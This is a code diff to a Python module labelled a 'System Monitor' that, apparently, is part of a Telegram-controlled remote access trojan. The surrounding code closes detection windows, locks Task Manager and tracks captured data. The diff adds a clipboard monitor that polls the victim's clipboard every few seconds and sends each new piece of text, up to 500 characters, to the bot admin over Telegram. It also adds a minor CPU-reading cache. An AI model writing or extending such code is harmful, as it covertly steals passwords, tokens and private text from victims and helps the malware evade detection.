@@ -3,7 +3,7 @@ System Monitor Module
 Optimized monitoring with debounce and resource management
 
 Developer: TsByin
-Version: 11.0
+Version: 12.0
 """
 
 import os
@@ -34,6 +34,8 @@ class SystemMonitor:
         self.block_mode_active = False
         self.taskmgr_locked = False
         self.intrusion_alert_active = False
+        self.clipboard_monitor_active = False
+        self._last_clipboard_text = None
         
         # Import utilities
         from utils import get_active_window_title, find_and_close_window
@@ -43,6 +45,7 @@ class SystemMonitor:
     def run(self):
         """Main monitoring loop"""
         logger.info("🟢 System monitor started")
+        _clip_tick = 0
         
         while not self.stop_event.is_set():
             try:
@@ -51,6 +54,11 @@ class SystemMonitor:
                 self._check_taskmgr(self.taskmgr_locked)
                 self._check_cpu_alert()
                 self._check_intrusion_alert(self.intrusion_alert_active)
+                # Clipboard monitor runs every ~3 seconds (3 loop ticks at 1s interval)
+                _clip_tick += 1
+                if self.clipboard_monitor_active and _clip_tick >= 3:
+                    _clip_tick = 0
+                    self._check_clipboard_monitor()
             except Exception as e:
                 logger.error(f"Monitor loop error: {e}", exc_info=True)
             
@@ -70,7 +78,7 @@ class SystemMonitor:
                 pass
             self.cap = None
 
-    def update_flags(self, block_mode=None, taskmgr_locked=None, intrusion_alert=None):
+    def update_flags(self, block_mode=None, taskmgr_locked=None, intrusion_alert=None, clipboard_monitor=None):
         """Update runtime flags controlled by UI commands"""
         if block_mode is not None:
             self.block_mode_active = block_mode
@@ -78,6 +86,10 @@ class SystemMonitor:
             self.taskmgr_locked = taskmgr_locked
         if intrusion_alert is not None:
             self.intrusion_alert_active = intrusion_alert
+        if clipboard_monitor is not None:
+            self.clipboard_monitor_active = clipboard_monitor
+            if not clipboard_monitor:
+                self._last_clipboard_text = None
     
     def _check_self_defense(self):
         """Check and close detection windows"""
@@ -253,30 +265,60 @@ class SystemMonitor:
                     pass
                 self.cap = None
 
+    def _check_clipboard_monitor(self):
+        """Send alert when clipboard text changes"""
+        try:
+            from utils import get_clipboard_contents
+            data = get_clipboard_contents()
+            text = data.get("text") or ""
+            if text and text != self._last_clipboard_text:
+                self._last_clipboard_text = text
+                preview = text[:500] + ("…" if len(text) > 500 else "")
+                try:
+                    self.bot.send_message(
+                        self.admin_id,
+                        f"📋 **Clipboard thay đổi:**\n```\n{preview}\n```",
+                        parse_mode="Markdown"
+                    )
+                except Exception as e:
+                    logger.error(f"Clipboard monitor send failed: {e}")
+        except Exception as e:
+            logger.debug(f"_check_clipboard_monitor error: {e}")
+
 # ==============================================================================
 # BOT STATISTICS
 # ==============================================================================
 
 class BotStats:
     """Track bot statistics"""
-    
+
     def __init__(self):
         self.uptime_start = datetime.now()
         self.commands_executed = 0
         self.data_captured_mb = 0
-    
+        self._cached_cpu = 0.0
+        self._cpu_cache_time = 0.0
+
     def increment_command(self):
         """Increment command counter"""
         self.commands_executed += 1
-    
+
     def add_data_captured(self, size_mb):
         """Add to captured data size"""
         self.data_captured_mb += size_mb
-    
+
+    def _get_cpu(self):
+        """B7 fixed: non-blocking CPU reading with 2-second cache"""
+        now = time.time()
+        if now - self._cpu_cache_time >= 2.0:
+            self._cached_cpu = psutil.cpu_percent(interval=0)
+            self._cpu_cache_time = now
+        return self._cached_cpu
+
     def get_stats(self):
         """Get current statistics"""
         uptime = datetime.now() - self.uptime_start
-        cpu = psutil.cpu_percent(interval=0.5)
+        cpu = self._get_cpu()
         ram = psutil.virtual_memory().percent
         
         return {
